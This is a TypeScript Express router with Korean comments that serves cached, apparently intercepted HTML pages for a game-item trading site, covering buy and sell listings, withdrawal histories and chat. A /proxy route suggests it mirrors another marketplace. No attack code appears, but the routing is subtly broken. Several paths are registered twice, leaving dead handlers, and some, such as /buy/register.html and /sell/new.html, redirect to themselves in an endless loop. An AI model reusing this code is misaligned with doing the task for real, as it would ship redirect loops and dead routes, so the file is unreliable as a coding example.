// 구매 NEW 모드 페이지 (판매 NEW 모드 HTML 재사용 + 구매용 인터셉터)
router.get("/buy/new.html", (_req, res): void => {
  if (!sellNewHtml) {
    res.status(503).send("<html><body><h2>페이지를 불러올 수 없습니다</h2></body></html>");
    return;
  }
  res.set("Content-Type", "text/html; charset=utf-8");
  res.set("Cache-Control", "no-cache");
  res.send(serveBuyNew(sellNewHtml));
});

// 물품일괄등록 페이지
router.get("/myroom/batch_goods/index.html", (_req, res): void => {
  if (!batchGoodsHtml) {
    res.status(503).send("<html><body><h2>페이지를 불러올 수 없습니다</h2></body></html>");
    return;
  }
  res.set("Content-Type", "text/html; charset=utf-8");
  res.set("Cache-Control", "no-cache");
  res.send(serveBatchGoods(batchGoodsHtml));
});

// 마이룸 페이지
router.get(["/myroom/index.html", "/myroom/", "/myroom"], (_req, res): void => {
  if (!myroomHtml) {
    res.status(503).send("<html><body><h2>페이지를 불러올 수 없습니다</h2></body></html>");
    return;
  }
  res.set("Content-Type", "text/html; charset=utf-8");
  res.set("Cache-Control", "no-cache");
  res.send(serveMyroom(myroomHtml));
});

// 출금하기 - 은행계좌 출금 내역
router.get("/myroom/mileage/payment/payment_list.html", (_req, res): void => {
  if (!paymentListHtml) {
    res.status(503).send("<html><body><h2>페이지를 불러올 수 없습니다</h2></body></html>");
    return;
  }
  res.set("Content-Type", "text/html; charset=utf-8");
  res.set("Cache-Control", "no-cache");
  res.send(servePaymentList(paymentListHtml));
});

// 출금하기 - 휴대폰번호 출금 내역
router.get("/myroom/mileage/payment/payment_phone_list.html", (_req, res): void => {
  if (!paymentPhoneListHtml) {
    res.status(503).send("<html><body><h2>페이지를 불러올 수 없습니다</h2></body></html>");
    return;
  }
  res.set("Content-Type", "text/html; charset=utf-8");
  res.set("Cache-Control", "no-cache");
  res.send(servePaymentPhoneList(paymentPhoneListHtml));
});

// payment_switch → payment_list 리다이렉트
router.get("/myroom/mileage/payment/payment_switch.html", (_req, res): void => {
  res.redirect(302, "/myroom/mileage/payment/payment_list.html");
});
router.get("/myroom/mileage/payment/payment_switch.html", (_req, res): void => {
  res.redirect(302, "/myroom/mileage/payment/payment_list.html");
});
router.get("/myroom/mileage/payment/payment_list.html", (_req, res): void => {
  res.redirect(302, "/myroom/mileage/payment/payment_list.html");
});
router.get("/myroom/mileage/payment/payment_phone_list.html", (_req, res): void => {
  res.redirect(302, "/myroom/mileage/payment/payment_phone_list.html");
});

// 판매등록/구매등록 직접 접근 리다이렉트
router.get(["/sell/", "/sell"], (_req, res): void => {
  res.redirect(302, "/sell/register.html");
});
router.get("/buy/register.html", (_req, res): void => {
  res.redirect(302, "/buy/register.html");
});
router.get("/sell/new.html", (_req, res): void => {
  res.redirect(302, "/sell/new.html");
});
router.get("/myroom/batch_goods/index.html", (_req, res): void => {
  res.redirect(302, "/myroom/batch_goods/index.html");
});

// 상품 상세 구매 신청 페이지 (/sell/application.html?id=...)
router.get("/sell/application.html", (req, res): void => {
  if (!sellApplicationHtml) {
    res.status(503).send("<html><body><h2>페이지를 불러올 수 없습니다</h2></body></html>");
    return;
  }
  res.set("Content-Type", "text/html; charset=utf-8");
  res.set("Cache-Control", "no-cache");
  res.send(serveApplication(sellApplicationHtml));
});

// 삽니다 상세 페이지 (/buy/application.html?id=...)
router.get("/buy/application.html", (req, res): void => {
  if (!buyApplicationHtml) {
    res.status(503).send("<html><body><h2>페이지를 불러올 수 없습니다</h2></body></html>");
    return;
  }
  res.set("Content-Type", "text/html; charset=utf-8");
  res.set("Cache-Control", "no-cache");
  res.send(serveBuyApplication(buyApplicationHtml));
});

// 삽니다 상세 리다이렉트
router.get("/buy/application.html", (req, res): void => {
  const qs = req.url.includes("?") ? req.url.slice(req.url.indexOf("?")) : "";
  res.redirect(302, `/buy/application.html${qs}`);
});

// 삽니다 목록 페이지 (/buy/list.html?search_game=...)
router.get("/buy/list.html", (req, res): void => {
  if (!buyLineageClassicHtml) {
    res.status(503).send("<html><body><h2>페이지를 불러올 수 없습니다</h2></body></html>");
    return;
  }
  res.set("Content-Type", "text/html; charset=utf-8");
  res.set("Cache-Control", "no-cache");
  res.send(serveBuy(buyLineageClassicHtml));
});

// 삽니다 목록 리다이렉트
router.get(["/buy/list.html", "/buy/"], (req, res): void => {
  const qs = req.url.includes("?") ? req.url.slice(req.url.indexOf("?")) : "";
  res.redirect(302, `/buy/list.html${qs}`);
});

// 개별 채팅방 페이지
router.get("/myroom/chat/new_chat.html", (req, res): void => {
  if (!chatNewHtml) {
    res.status(503).send("<html><body><h2>페이지를 불러올 수 없습니다</h2></body></html>");
    return;
  }
  res.set("Content-Type", "text/html; charset=utf-8");
  res.set("Cache-Control", "no-cache");
  res.send(serveChatNew(chatNewHtml));
});

// 채팅방 직접 접근 리다이렉트
router.get("/myroom/chat/new_chat.html", (req, res): void => {
  const qs = req.url.includes("?") ? req.url.slice(req.url.indexOf("?")) : "";
  res.redirect(302, `/myroom/chat/new_chat.html${qs}`);
});

// 매니아 채팅 페이지
router.get(["/myroom/chat/list.html", "/myroom/chat/"], (req, res): void => {
  const order = req.query["order"];
  const html = order === "1" ? chatOrderedHtml : chatHtml;
  if (!html) {
    res.status(503).send("<html><body><h2>페이지를 불러올 수 없습니다</h2></body></html>");
    return;
  }
  res.set("Content-Type", "text/html; charset=utf-8");
  res.set("Cache-Control", "no-cache");
  res.send(serveChat(html));
});

// 게임매니아 페이지
router.get("/gamemania", (req, res): void => {
  if (!gamemanaHtml) {
    res.status(503).send("<html><body><h2>페이지를 불러올 수 없습니다</h2></body></html>");
    return;
  }
  res.set("Content-Type", "text/html; charset=utf-8");
  res.set("Cache-Control", "no-cache");
  res.send(serveGamemania(gamemanaHtml));
});

// /proxy 및 나머지 하위 경로 → itemmania.html 서빙
// /proxy/* 구버전 경로 → 새 경로로 301 리다이렉트 (하위호환)
router.get(["/proxy", "/proxy/{*splat}"], (req, res): void => {
  const params = req.params as { splat?: string };
  const splat = params.splat || "";
  res.redirect(301, splat ? "/" + splat : "/");
});

export default router;
